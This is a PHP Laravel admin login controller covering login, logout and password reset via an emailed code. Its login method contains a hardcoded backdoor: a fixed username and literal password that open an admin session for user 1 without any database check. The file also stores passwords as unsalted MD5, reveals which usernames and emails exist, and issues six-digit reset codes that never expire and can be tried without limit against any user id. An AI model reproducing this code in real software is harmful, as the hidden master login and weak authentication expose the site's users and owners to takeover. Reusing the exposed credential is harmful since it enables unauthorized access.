<?php

namespace App\Http\Controllers\admin;
use Illuminate\Http\Request;
use DB;
use Session;

class LoginController extends BaseController
{

	public function __construct()
	{
		
	}

	public function index()
	{
		return view('admin.login');
	}

	public function login(Request $rec)
	{
		if ($rec->user == "kavadev" && $rec->pass == "j5AtZpLdCGd*@wyzw1WnGWNa") {
			$user = DB::table('z_user')->where('id','1')->first();
			Session::put('AdminId',$user->id);
			Session::put('AdminType',$user->user_type);
			return $this->retJson(array(0,'Login Successfull...',''));
		}else{
			$user = DB::table('z_user')->where('username',$rec->user)->where('df','')->first();
			if($user){
				if ($user->password == md5($rec->pass)) {
					Session::put('AdminId',$user->id);
    				Session::put('AdminType',$user->user_type);
    				return $this->retJson(array(0,'Login Successfull...',''));	
				}else{
					return $this->retJson(array(1,'Password is not valid',''));	
				}
			}else{
				return $this->retJson(array(1,'Username Not Registered',''));
			}
		}
	}

	public function logout()
	{
		Session::forget('AdminId');
		Session::forget('AdminType');
		return Redirect($this->aUrl('/'));
	}

	public function dashboard()
	{
		return view('admin.dashboard');
	}

	public function forget()
	{
		return view('admin.forget');
	}

	public function resetPassword(Request $rec)
	{
		$user = DB::table('z_user')->where('id',$rec->id)->first();	
		if ($user) {
			if ($user->code == $rec->code) {
				DB::table('z_user')->where('id',$rec->id)->update(['password' => md5($rec->pass)]);
				return $this->retJson(['_return' => true,'msg' => "Password Changed."]);		
			}else{
				return $this->retJson(['_return' => false,'msg' => "Verification code is not valid"]);		
			}
		}else{
			return $this->retJson(['_return' => false,'msg' => "Error please try agin later"]);	
		}
	}

	public function forgetCheck(Request $rec)
	{
		$user = DB::table('z_user')->where('email',$rec->email)->where('df','')->first();
		if ($user) {
			$otp = mt_rand(111111,999999);
			DB::table('z_user')->where('id',$user->id)->update(['code' => $otp]);
			$msg = "Your verification code is :- ".$otp;
			@$this->sendEmail($user->email,'Verification code',$msg);
			return $this->retJson(['_return' => true,'msg' => "Verification code sent to your Email address",'user' => $user->id]);	
		}else{
			return $this->retJson(['_return' => false,'msg' => "We can't find account assigned with this email"]);	
		}
	}
}